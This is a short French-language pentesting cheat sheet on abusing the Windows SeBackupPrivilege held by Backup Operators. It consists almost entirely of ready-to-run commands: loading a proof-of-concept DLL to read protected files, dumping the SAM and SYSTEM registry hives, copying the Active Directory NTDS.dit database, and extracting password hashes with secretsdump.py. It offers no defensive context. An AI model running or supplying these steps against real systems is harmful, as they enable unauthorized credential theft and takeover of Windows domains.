# Backup Operator Privesc

## Backup Operator

[https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

Importer les .dll du PoC:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Voir si le groupe est disabled/enabled:

```powershell
Get-SeBackupPrivilege
```

Activer le privilège:

```powershell
Set-SeBackupPrivilege
```

Copier un fichier qui nous est normalement bloqué par les droits:

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

## SYSTEM et SAM

Faire une copie des clefs de registre SYSTEM et SAM, permettant d'en extraire des creds locaux:

```powershell
reg save HKLM\SAM SAM.SAV
reg save HKLM\SYSTEM SYSTEM.SAV
```

Les transférer puis en extraire les différentes infos:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## Active Directory

Dans le cas d'un AD, ce droit permet de faire une copie du NTDS.dit, la base de donnée des utilisateurs/mot de passe. Il est donc possible ensuite d'en extraire des creds.

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
ou
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
